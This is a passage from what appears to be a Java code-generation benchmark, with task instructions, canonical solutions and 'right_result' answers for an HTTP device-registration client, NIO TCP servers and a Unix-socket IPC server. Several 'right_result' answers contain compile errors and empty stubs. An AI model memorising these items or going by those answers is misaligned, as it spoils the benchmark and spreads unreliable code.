    "Instruction": "Task Description: Create a Java class that handles HTTP communication with a hub service, specifically for device registration and key management.\n\nClass Description: The HubHttpClient class provides functionality to register a device with a remote hub service using HTTP requests. It handles JSON serialization, authentication, and response processing, while supporting asynchronous operations.\n\nAttributes:\n- JSON: ObjectMapper - A static instance for JSON serialization/deserialization\n- EXPECTED_RESPONSE_CODES: List<Integer> - List of acceptable HTTP response codes\n- hubConfig: HubConfig - Configuration for the hub service\n- bearerToken: String - Authentication token for API requests\n- deviceId: String - Unique identifier for the device\n- keyPair: P384KeyPair - Cryptographic key pair for the device\n- result: CompletableFuture<ReceivedKey> - Future for asynchronous result handling\n- httpClient: HttpClient - HTTP client for making requests\n\nMethods:\n- HubHttpClient(ExecutorService, HubConfig, String, DeviceKey, CompletableFuture<ReceivedKey>, AtomicReference<String>) -> None - Constructor that initializes the HTTP client with configuration and credentials\n- registerDevice(String) -> None - Registers a device with the hub service using the provided device name\n- toJson(CreateDeviceDto) -> String - Serializes a DTO to JSON string\n- handleResponse(HttpResponse<Void>) -> HttpResponse<Void> - Processes the HTTP response\n- registrationFailed(Throwable) -> None - Handles failed registration attempts\n\nNested Class:\n- CreateDeviceDto - Data transfer object for device registration containing:\n  * id: String - Device identifier\n  * name: String - Device name\n  * type: String - Constant device type (\"DESKTOP\")\n  * publicKey: String - Base64-encoded public key",
    "Canonical_solution": "import com.auth0.jwt.JWT;\nimport com.auth0.jwt.interfaces.DecodedJWT;\nimport com.fasterxml.jackson.core.JacksonException;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.cryptomator.common.settings.DeviceKey;\nimport org.cryptomator.cryptolib.common.P384KeyPair;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Base64;\nimport java.util.List;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class HubHttpClient {\n\n\tprivate static final ObjectMapper JSON = new ObjectMapper().setDefaultLeniency(true);\n\tprivate static final List<Integer> EXPECTED_RESPONSE_CODES = List.of(201, 409);\n\n\tprivate final HubConfig hubConfig;\n\tprivate final String bearerToken;\n\tprivate final String deviceId;\n\tprivate final P384KeyPair keyPair;\n\tprivate final CompletableFuture<ReceivedKey> result;\n\tprivate final HttpClient httpClient;\n\n\tpublic HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, DeviceKey deviceKey, CompletableFuture<ReceivedKey> result, AtomicReference<String> bearerToken) {\n\t\tthis.hubConfig = hubConfig;\n\t\tthis.deviceId = deviceId;\n\t\tthis.keyPair = Objects.requireNonNull(deviceKey.get());\n\t\tthis.result = result;\n\t\tthis.bearerToken = Objects.requireNonNull(bearerToken.get());\n\t\tthis.httpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).executor(executor).build();\n\t}\n\n\tpublic void registerDevice(String deviceName) {\n\t\tvar deviceUri = URI.create(hubConfig.devicesResourceUrl + deviceId);\n\t\tvar deviceKey = keyPair.getPublic().getEncoded();\n\t\tvar dto = new CreateDeviceDto();\n\t\tdto.id = deviceId;\n\t\tdto.name = deviceName;\n\t\tdto.publicKey = Base64.getUrlEncoder().withoutPadding().encodeToString(deviceKey);\n\t\tvar json = toJson(dto);\n\t\tvar request = HttpRequest.newBuilder(deviceUri)\n\t\t\t\t.PUT(HttpRequest.BodyPublishers.ofString(json, StandardCharsets.UTF_8))\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.header(\"Content-Type\", \"application/json\")\n\t\t\t\t.build();\n\t\thttpClient.sendAsync(request, HttpResponse.BodyHandlers.discarding())\n\t\t\t\t.thenApply(response -> {\n\t\t\t\t\tif (EXPECTED_RESPONSE_CODES.contains(response.statusCode())) {\n\t\t\t\t\t\treturn response;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tthrow new RuntimeException(\"Server answered with unexpected status code \" + response.statusCode());\n\t\t\t\t\t}\n\t\t\t\t}).handle((response, throwable) -> {\n\t\t\t\t\tif (response != null) {\n\t\t\t\t\t\treturn handleResponse(response);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tregistrationFailed(throwable);\n\t\t\t\t\t\treturn null;\n\t\t\t\t\t}\n\t\t\t\t});\n\t}\n\n\tprivate String toJson(CreateDeviceDto dto) {\n\t\ttry {\n\t\t\treturn JSON.writer().writeValueAsString(dto);\n\t\t} catch (JacksonException e) {\n\t\t\tthrow new IllegalStateException(\"Failed to serialize DTO\", e);\n\t\t}\n\t}\n\n\tprivate HttpResponse<Void> handleResponse(HttpResponse<Void> voidHttpResponse) {\n\t\tassert EXPECTED_RESPONSE_CODES.contains(voidHttpResponse.statusCode());\n\t\treturn voidHttpResponse;\n\t}\n\n\tprivate void registrationFailed(Throwable cause) {\n\t\tresult.completeExceptionally(cause);\n\t}\n\n\tprivate static class CreateDeviceDto {\n\t\tpublic String id;\n\t\tpublic String name;\n\t\tpublic final String type = \"DESKTOP\";\n\t\tpublic String publicKey;\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "```java\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class HubHttpClient {\n    private static final ObjectMapper JSON = new ObjectMapper();\n    private static final List<Integer> EXPECTED_RESPONSE_CODES = Arrays.asList(200, 201);\n    private final HubConfig hubConfig;\n    private final String bearerToken;\n    private final String deviceId;\n    private final P384KeyPair keyPair;\n    private final CompletableFuture<ReceivedKey> result;\n    private final HttpClient httpClient;\n\n    public HubHttpClient(ExecutorService executorService, HubConfig hubConfig, String deviceId, DeviceKey deviceKey, CompletableFuture<ReceivedKey> result, AtomicReference<String> bearerTokenRef) {\n        this.hubConfig = hubConfig;\n        this.bearerToken = bearerTokenRef.get();\n        this.deviceId = deviceId;\n        this.keyPair = deviceKey.getKeyPair();\n        this.result = result;\n        this.httpClient = HttpClient.newBuilder().executor(executorService).build();\n    }\n\n    public void registerDevice(String deviceName) {\n        try {\n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(hubConfig.getRegistrationUrl())\n                    .header(\"Authorization\", \"Bearer \" + bearerToken)\n                    .POST(HttpRequest.BodyPublishers.ofString(toJson(new CreateDeviceDto(deviceId, deviceName, \"DESKTOP\", keyPair.getPublicKeyBase64()))))\n                    .build();\n\n            httpClient.sendAsync(request, HttpResponse.BodyHandlers.discarding()).thenApply(this::handleResponse).exceptionally(ex -> registrationFailed(ex)).thenAccept(response -> result.complete(null));\n        } catch (Exception e) {\n            registrationFailed(e);\n        }\n    }\n\n    private String toJson(CreateDeviceDto dto) throws Exception {\n        return JSON.writeValueAsString(dto);\n    }\n\n    private HttpResponse<Void> handleResponse(HttpResponse<Void> response) {\n        if (EXPECTED_RESPONSE_CODES.contains(response.statusCode())) {\n            return response;\n        } else {\n            throw new RuntimeException(\"Unexpected response code: \" + response.statusCode());\n        }\n    }\n\n    private void registrationFailed(Throwable ex) {\n        result.completeExceptionally(ex);\n    }\n\n    public static class CreateDeviceDto {\n        private final String id;\n        private final String name;\n        private final String type;\n        private final String publicKey;\n\n        public CreateDeviceDto(String id, String name, String type, String publicKey) {\n            this.id = id;\n            this.name = name;\n            this.type = type;\n            this.publicKey = publicKey;\n        }\n\n        // Getters for id, name, type, publicKey\n    }\n}\n```"
  },
  {
    "Task_id": 440,
    "Instruction": "Task Description: Implement a Java NIO-based TCP server that handles multiple client connections asynchronously, processes incoming data, and sends responses back to clients.\n\nClass Description: The Server class implements a Component interface and provides non-blocking TCP server functionality using Java NIO channels and selectors. It manages client connections, reads incoming data in a length-prefixed format, processes commands, and writes responses back to clients.\n\nAttributes:\n- SERVER_PORT: [int] - The port number on which the server listens for incoming connections\n- conMan: [NIOConnectionManager] - Manages NIO connections and selection operations\n- acceptor: [ServerSocketChannel] - The main server socket channel that accepts incoming connections\n- dhts: [Collection<DHT>] - Collection of DHT instances used for command processing\n\nMethods:\n- start([Collection<DHT> dhts, ConfigReader config]) -> [void] - Initializes the server by creating a non-blocking ServerSocketChannel, binding it to the specified port, and registering it with the connection manager\n- stop() -> [void] - Stops the server by closing the ServerSocketChannel and releasing resources\n- accept() -> [void] - Accepts new client connections, configures them as non-blocking, and registers them with the connection manager for read/write operations\n- read() -> [void] - Reads data from a client channel in a length-prefixed format (4-byte header followed by payload)\n- process([ByteBuffer buf]) -> [void] - Processes the received data buffer by decoding it and executing the appropriate command\n- write() -> [void] - Writes response data back to the client channel\n- calcInterestOps() -> [int] - Calculates the current interest operations (OP_READ/OP_WRITE) for the selection key\n- selectionEvent([SelectionKey key]) -> [void] - Handles selection events (readable/writable) for client channels\n- registrationEvent([NIOConnectionManager manager, SelectionKey key]) -> [void] - Handles registration events with the connection manager\n- getChannel() -> [SelectableChannel] - Returns the associated channel (either server or client channel)\n- doStateChecks([long now]) -> [void] - Performs periodic state checks (currently empty implementation)",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.StandardSocketOptions;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectableChannel;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Paths;\nimport java.util.Collection;\nimport java.util.Deque;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentLinkedDeque;\n\nimport lbms.plugins.mldht.kad.DHT;\nimport lbms.plugins.mldht.utils.NIOConnectionManager;\nimport lbms.plugins.mldht.utils.Selectable;\nimport the8472.bencode.BDecoder;\nimport the8472.mldht.Component;\nimport the8472.utils.ConfigReader;\n\npublic class Server implements Component {\n\t\n\tpublic static int SERVER_PORT = 33348;\n\t\n\tNIOConnectionManager conMan = new NIOConnectionManager(\"CLI-server\");\n\tServerSocketChannel acceptor;\n\tCollection<DHT> dhts;\n\t\n\t@Override\n\tpublic void start(Collection<DHT> dhts, ConfigReader config) {\n\t\tthis.dhts = dhts;\n\t\t\n\t\ttry {\n\t\t\tacceptor = ServerSocketChannel.open();\n\t\t\tacceptor.configureBlocking(false);\n\t\t\tacceptor.setOption(StandardSocketOptions.SO_REUSEADDR, true);\n\t\t\tacceptor.bind(new InetSocketAddress(InetAddress.getLoopbackAddress(), SERVER_PORT));\n\t\t\t\n\t\t\tconMan.register(new Selectable() {\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void selectionEvent(SelectionKey key) throws IOException {\n\t\t\t\t\tif(key.isAcceptable())\n\t\t\t\t\t\taccept();\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void registrationEvent(NIOConnectionManager manager, SelectionKey key) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic SelectableChannel getChannel() {\n\t\t\t\t\treturn acceptor;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void doStateChecks(long now) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic int calcInterestOps() {\n\t\t\t\t\treturn SelectionKey.OP_ACCEPT;\n\t\t\t\t}\n\t\t\t});\n\t\t\t\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\t\n\tvoid accept() {\n\t\ttry {\n\t\t\tSocketChannel chan = acceptor.accept();\n\t\t\tchan.configureBlocking(false);\n\t\t\tchan.socket().setSoTimeout(0);\n\t\t\tchan.setOption(StandardSocketOptions.SO_KEEPALIVE, true);\n\t\t\t\n\t\t\tconMan.register(new Selectable() {\n\t\t\t\t\n\t\t\t\tByteBuffer header = ByteBuffer.allocate(4);\n\t\t\t\tByteBuffer payload = null;\n\t\t\t\tByteBuffer currentReadTarget = header;\n\t\t\t\tDeque<ByteBuffer> writes = new ConcurrentLinkedDeque<>();\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void selectionEvent(SelectionKey key) throws IOException {\n\t\t\t\t\tif(!chan.isOpen()) {\n\t\t\t\t\t\tconMan.deRegister(this);\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\t\t\tif(key.isValid() && key.isReadable())\n\t\t\t\t\t\tread();\n\t\t\t\t\tif(key.isValid() && key.isWritable())\n\t\t\t\t\t\twrite();\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid read() throws IOException {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tint read = chan.read(currentReadTarget);\n\t\t\t\t\t\t\n\t\t\t\t\t\tif(read == -1) {\n\t\t\t\t\t\t\theader = null;\n\t\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\n\t\t\t\t\t\tif(currentReadTarget.remaining() == 0) {\n\t\t\t\t\t\t\tcurrentReadTarget.flip();\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif(currentReadTarget == header) {\n\t\t\t\t\t\t\t\tpayload = ByteBuffer.allocate(header.getInt(0));\n\t\t\t\t\t\t\t\tcurrentReadTarget = payload;\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\tprocess(payload);\n\t\t\t\t\t\t\t\tpayload = null;\n\t\t\t\t\t\t\t\theader.clear();\n\t\t\t\t\t\t\t\tcurrentReadTarget = header;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t\tchan.close();\n\t\t\t\t\t}\t\t\t\t\t\t\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid process(ByteBuffer buf) {\n\t\t\t\t\tBDecoder decoder = new BDecoder();\n\t\t\t\t\tMap<String, Object> map = decoder.decode(buf);\n\t\t\t\t\tList<byte[]> args = (List<byte[]>) map.get(\"arguments\");\n\t\t\t\t\tCommandProcessor processor = CommandProcessor.from(args, (b) -> {\n\t\t\t\t\t\tByteBuffer h = ByteBuffer.allocate(4);\n\t\t\t\t\t\th.putInt(0, b.remaining());\n\t\t\t\t\t\tsynchronized (writes) {\n\t\t\t\t\t\t\twrites.add(h);\n\t\t\t\t\t\t\twrites.add(b);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t\t}, dhts);\n\t\t\t\t\tprocessor.currentWorkDir = Paths.get(new String((byte[])map.get(\"cwd\"), StandardCharsets.UTF_8));\n\t\t\t\t\tprocessor.active = chan::isOpen;\n\t\t\t\t\ttry {\n\t\t\t\t\t\tprocessor.process();\n\t\t\t\t\t} catch(Exception e) {\n\t\t\t\t\t\tprocessor.handleException(e);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid write() throws IOException {\n\t\t\t\t\ttry {\n\t\t\t\t\t\twhile (!writes.isEmpty()) {\n\t\t\t\t\t\t\tif (!writes.peekFirst().hasRemaining()) {\n\t\t\t\t\t\t\t\twrites.removeFirst();\n\t\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tlong written = chan.write(writes.stream().toArray(ByteBuffer[]::new));\n\t\t\t\t\t\t\tif (written == 0)\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t\tchan.close();\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\n\t\t\t\t\tif(writes.isEmpty())\n\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void registrationEvent(NIOConnectionManager manager, SelectionKey key) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic SelectableChannel getChannel() {\n\t\t\t\t\treturn chan;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void doStateChecks(long now) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic int calcInterestOps() {\n\t\t\t\t\tint ops = 0;\n\t\t\t\t\tif(header != null)\n\t\t\t\t\t\tops = SelectionKey.OP_READ;\n\t\t\t\t\tif(writes.peek() != null)\n\t\t\t\t\t\tops |= SelectionKey.OP_WRITE;\n\t\t\t\t\treturn ops;\n\t\t\t\t}\n\t\t\t});\n\t\t\t\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\t\n\t@Override\n\tpublic void stop() {\n\t\ttry {\n\t\t\tacceptor.close();\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Collection;\nimport java.util.Iterator;\n\npublic class Server implements Component {\n    private static final int SERVER_PORT = 8080;\n    private NIOConnectionManager conMan;\n    private ServerSocketChannel acceptor;\n    private Collection<DHT> dhts;\n\n    public void start(Collection<DHT> dhts, ConfigReader config) throws IOException {\n        this.dhts = dhts;\n        Selector selector = Selector.open();\n        acceptor = ServerSocketChannel.open();\n        acceptor.bind(new InetSocketAddress(SERVER_PORT));\n        acceptor.configureBlocking(false);\n        acceptor.register(selector, SelectionKey.OP_ACCEPT);\n        conMan = new NIOConnectionManager(selector);\n    }\n\n    public void stop() throws IOException {\n        acceptor.close();\n        conMan.releaseResources();\n    }\n\n    public void accept() throws IOException {\n        SocketChannel client = acceptor.accept();\n        if (client != null) {\n            client.configureBlocking(false);\n            client.register(conMan.getSelector(), SelectionKey.OP_READ);\n        }\n    }\n\n    public void read() throws IOException {\n        Iterator<SelectionKey> keys = conMan.getSelector().selectedKeys().iterator();\n        while (keys.hasNext()) {\n            SelectionKey key = keys.next();\n            if (!key.isValid()) continue;\n            if (key.isReadable()) {\n                SocketChannel channel = (SocketChannel) key.channel();\n                ByteBuffer buffer = ByteBuffer.allocate(1024);\n                int bytesRead = channel.read(buffer);\n                if (bytesRead == -1) {\n                    channel.close();\n                } else {\n                    buffer.flip();\n                    process(buffer);\n                }\n            }\n            keys.remove();\n        }\n    }\n\n    public void process(ByteBuffer buf) {\n        // Decode and execute command based on the buffer content\n    }\n\n    public void write() throws IOException {\n        Iterator<SelectionKey> keys = conMan.getSelector().selectedKeys().iterator();\n        while (keys.hasNext()) {\n            SelectionKey key = keys.next();\n            if (!key.isValid()) continue;\n            if (key.isWritable()) {\n                SocketChannel channel = (SocketChannel) key.channel();\n                ByteBuffer buffer = (ByteBuffer) key.attachment();\n                channel.write(buffer);\n                if (!buffer.hasRemaining()) {\n                    buffer.clear();\n                    key.interestOps(calcInterestOps());\n                }\n            }\n            keys.remove();\n        }\n    }\n\n    public int calcInterestOps() {\n        return SelectionKey.OP_READ | SelectionKey.OP_WRITE;\n    }\n\n    public void selectionEvent(SelectionKey key) {\n        if (key.isAcceptable()) {\n            try {\n                accept();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else if (key.isReadable()) {\n            try {\n                read();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else if (key.isWritable()) {\n            try {\n                write();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void registrationEvent(NIOConnectionManager manager, SelectionKey key) {\n        // Handle registration event\n    }\n\n    public SelectableChannel getChannel() {\n        return acceptor;\n    }\n\n    public void doStateChecks(long now) {\n        // Perform periodic state checks\n    }\n}\n```"
  },
  {
    "Task_id": 441,
    "Instruction": "Task Description: Implement a Unix domain socket-based IPC server using Java NIO that can listen for incoming messages and send responses asynchronously.\n\nClass Description: The Server class implements an IPC communicator that establishes a Unix domain socket server. It handles client connections asynchronously, processes incoming messages through a listener callback, and sends responses. The server manages its socket resources and cleans up the socket file on termination.\n\nAttributes:\n- serverSocketChannel: [ServerSocketChannel] - The NIO channel for accepting client connections on the Unix domain socket\n- socketPath: [Path] - Filesystem path where the Unix domain socket is created\n- LOG: [Logger] - Logger instance for recording server events and errors\n\nMethods:\n- create: [static](Path socketPath) -> [Server] - Factory method that creates and binds a Unix domain socket server at the specified path. Throws IOException if binding fails.\n- isClient: []() -> [boolean] - Returns false indicating this is a server-side communicator (always returns false for Server instances)\n- listen: [](IpcMessageListener listener, Executor executor) -> [void] - Starts listening for incoming messages asynchronously using the provided executor. Each message is delivered to the listener callback.\n- send: [](IpcMessage message, Executor executor) -> [void] - Sends a message to a connected client asynchronously using the provided executor.\n- close: []() -> [void] - Closes the server socket channel and deletes the socket file. Throws IOException if cleanup fails.",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.net.StandardProtocolFamily;\nimport java.net.UnixDomainSocketAddress;\nimport java.nio.channels.AlreadyBoundException;\nimport java.nio.channels.AsynchronousCloseException;\nimport java.nio.channels.ClosedChannelException;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.UnsupportedAddressTypeException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.concurrent.Executor;\n\nclass Server implements IpcCommunicator {\n\n\tprivate static final Logger LOG = LoggerFactory.getLogger(Server.class);\n\n\tprivate final ServerSocketChannel serverSocketChannel;\n\tprivate final Path socketPath;\n\n\tprivate Server(ServerSocketChannel serverSocketChannel, Path socketPath) {\n\t\tthis.serverSocketChannel = serverSocketChannel;\n\t\tthis.socketPath = socketPath;\n\t}\n\n\tpublic static Server create(Path socketPath) throws IOException {\n\t\tFiles.createDirectories(socketPath.getParent());\n\t\tvar address = UnixDomainSocketAddress.of(socketPath);\n\t\tServerSocketChannel ch = null;\n\t\ttry {\n\t\t\tch = ServerSocketChannel.open(StandardProtocolFamily.UNIX);\n\t\t\tch.bind(address);\n\t\t\tLOG.info(\"Spawning IPC server listening on socket {}\", socketPath);\n\t\t\treturn new Server(ch, socketPath);\n\t\t} catch (IOException | AlreadyBoundException | UnsupportedAddressTypeException e) {\n\t\t\tif (ch != null) {\n\t\t\t\tch.close();\n\t\t\t}\n\t\t\tthrow e;\n\t\t}\n\t}\n\n\t@Override\n\tpublic boolean isClient() {\n\t\treturn false;\n\t}\n\n\t@Override\n\tpublic void listen(IpcMessageListener listener, Executor executor) {\n\t\texecutor.execute(() -> {\n\t\t\twhile (serverSocketChannel.isOpen()) {\n\t\t\t\ttry (var ch = serverSocketChannel.accept()) {\n\t\t\t\t\twhile (ch.isConnected()) {\n\t\t\t\t\t\tvar msg = IpcMessage.receive(ch);\n\t\t\t\t\t\tlistener.handleMessage(msg);\n\t\t\t\t\t}\n\t\t\t\t} catch (AsynchronousCloseException e) {\n\t\t\t\t\treturn;\n\t\t\t\t} catch (EOFException | ClosedChannelException e) {\n\t\t\t\t\t// continue with next connected client\n\t\t\t\t} catch (IOException e) {\n\t\t\t\t\tLOG.error(\"Failed to read IPC message\", e);\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t}\n\n\t@Override\n\tpublic void send(IpcMessage message, Executor executor) {\n\t\texecutor.execute(() -> {\n\t\t\ttry (var ch = serverSocketChannel.accept()) {\n\t\t\t\tmessage.send(ch);\n\t\t\t} catch (IOException e) {\n\t\t\t\tLOG.error(\"Failed to send IPC message\", e);\n\t\t\t}\n\t\t});\n\t}\n\n\t@Override\n\tpublic void close() throws IOException {\n\t\ttry {\n\t\t\tserverSocketChannel.close();\n\t\t} finally {\n\t\t\tFiles.deleteIfExists(socketPath);\n\t\t\tLOG.debug(\"IPC server closed\");\n\t\t}\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.StandardProtocolFamily;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.*;\nimport java.nio.file.Path;\nimport java.util.concurrent.Executor;\nimport java.util.logging.Logger;\n\npublic class Server {\n    private final ServerSocketChannel serverSocketChannel;\n    private final Path socketPath;\n    private static final Logger LOG = Logger.getLogger(Server.class.getName());\n\n    private Server(Path socketPath, ServerSocketChannel serverSocketChannel) {\n        this.socketPath = socketPath;\n        this.serverSocketChannel = serverSocketChannel;\n    }\n\n    public static Server create(Path socketPath) throws IOException {\n        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open(StandardProtocolFamily.UNIX);\n        serverSocketChannel.bind(socketPath);\n        return new Server(socketPath, serverSocketChannel);\n    }\n\n    public boolean isClient() {\n        return false;\n    }\n\n    public void listen(IpcMessageListener listener, Executor executor) {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                SocketChannel clientChannel = serverSocketChannel.accept();\n                executor.execute(() -> handleClient(clientChannel, listener));\n            }\n        } catch (IOException e) {\n            LOG.severe(\"Error accepting client connection: \" + e.getMessage());\n        }\n    }\n\n    private void handleClient(SocketChannel clientChannel, IpcMessageListener listener) {\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        try {\n            int bytesRead;\n            while ((bytesRead = clientChannel.read(buffer)) != -1) {\n                buffer.flip();\n                byte[] data = new byte[buffer.remaining()];\n                buffer.get(data);\n                IpcMessage message = new IpcMessage(data);\n                listener.onMessageReceived(message);\n                buffer.clear();\n            }\n        } catch (IOException e) {\n            LOG.severe(\"Error reading from client: \" + e.getMessage());\n        } finally {\n            try {\n                clientChannel.close();\n            } catch (IOException e) {\n                LOG.severe(\"Error closing client channel: \" + e.getMessage());\n            }\n        }\n    }\n\n    public void send(IpcMessage message, Executor executor) {\n        executor.execute(() -> {\n            try (SocketChannel clientChannel = SocketChannel.open(serverSocketChannel.getLocalAddress())) {\n                ByteBuffer buffer = ByteBuffer.wrap(message.getData());\n                clientChannel.write(buffer);\n            } catch (IOException e) {\n                LOG.severe(\"Error sending message: \" + e.getMessage());\n            }\n        });\n    }\n\n    public void close() throws IOException {\n        serverSocketChannel.close();\n        Files.deleteIfExists(socketPath);\n    }\n}\n```"
  },
  {
    "Task_id": 442,
    "Instruction": "Task Description: Implement a Java NIO-based TCP server that handles multiple client connections asynchronously, processes incoming data packets with checksum verification, and manages resources efficiently.\n\nClass Description: NIOServer - A non-blocking TCP server implementation using Java NIO that handles multiple client connections through a single selector thread.\n\nAttributes:\n- serverChannel: ServerSocketChannel - The main server channel that listens for incoming connections\n- selector: Selector - The multiplexor that manages multiple client connections\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port and begins accepting connections\n  - Input: port (int) - The port number to bind the server to\n  - Output: None (throws Exception if startup fails)\n  \n- stop() -> void - Shuts down the server and releases all resources\n  - Input: None\n  - Output: None (handles exceptions internally)\n  \n- handleAccept(SelectionKey key) -> void - Handles new client connection acceptance\n  - Input: key (SelectionKey) - The selection key representing the accept event\n  - Output: None (throws Exception if connection acceptance fails)\n  \n- handleRead(SelectionKey key) -> void - Handles incoming data from clients with checksum verification\n  - Input: key (SelectionKey) - The selection key representing the read event\n  - Output: None (handles exceptions internally)\n  \n- isFull(ByteBuffer buffer) -> boolean - Helper method to check if a buffer is full\n  - Input: buffer (ByteBuffer) - The buffer to check\n  - Output: boolean - True if buffer is full, false otherwise",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.zip.Adler32;\nimport java.util.zip.Checksum;\n\npublic class NIOServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n\n    public void start(int port) throws Exception {\n        serverChannel = ServerSocketChannel.open();\n        serverChannel.configureBlocking(false);\n        serverChannel.socket().setReuseAddress(true);\n        serverChannel.socket().bind(new InetSocketAddress(port));\n        \n        selector = Selector.open();\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n        \n        while (selector.isOpen()) {\n            if (selector.select(3000) == 0) {\n                continue;\n            }\n            \n            Iterator<SelectionKey> it = selector.selectedKeys().iterator();\n            while (it.hasNext()) {\n                SelectionKey key = it.next();\n                it.remove();\n                \n                if (!key.isValid()) {\n                    continue;\n                }\n                \n                if (key.isAcceptable()) {\n                    handleAccept(key);\n                } else if (key.isReadable()) {\n                    handleRead(key);\n                }\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws Exception {\n        SocketChannel socketChannel = ((ServerSocketChannel) key.channel()).accept();\n        socketChannel.configureBlocking(false);\n        socketChannel.register(key.selector(), SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key) {\n        SocketChannel channel = (SocketChannel) key.channel();\n        try {\n            ByteBuffer head = ByteBuffer.allocate(4);\n            while (!isFull(head)) {\n                if (channel.read(head) == -1) {\n                    throw new RuntimeException(\"EOF error\");\n                }\n            }\n            head.flip();\n            int dataSize = head.getInt();\n            \n            ByteBuffer body = ByteBuffer.allocate(dataSize);\n            while (!isFull(body)) {\n                if (channel.read(body) == -1) {\n                    throw new RuntimeException(\"EOF error\");\n                }\n            }\n            \n            ByteBuffer tail = ByteBuffer.allocate(8);\n            while (!isFull(tail)) {\n                if (channel.read(tail) == -1) {\n                    break;\n                }\n            }\n            tail.flip();\n            \n            Checksum checksum = new Adler32();\n            checksum.update(body.array(), 0, dataSize);\n            